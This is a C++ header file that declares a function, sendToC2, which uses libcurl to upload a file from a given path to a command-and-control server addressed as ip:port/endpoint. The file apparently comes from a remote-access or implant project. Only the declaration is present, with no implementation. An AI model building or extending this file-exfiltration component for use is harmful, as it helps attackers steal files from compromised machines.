#ifndef POST_H
#define POST_H

/* Standard Header Files*/
#include <string>
#include <fstream>
#include <iostream>
#include <curl/curl.h>
#include <vector>

using namespace std;

/*
* example use case: sendToC2(path, url, filename, taskid) where path is the path to the file(include the filename), url is the url 
* with format ip:port/endpoint, filename being the file name C2 going to recive after calling get file name in python code
*/
void sendToC2(string, string, string, string, string);

#endif
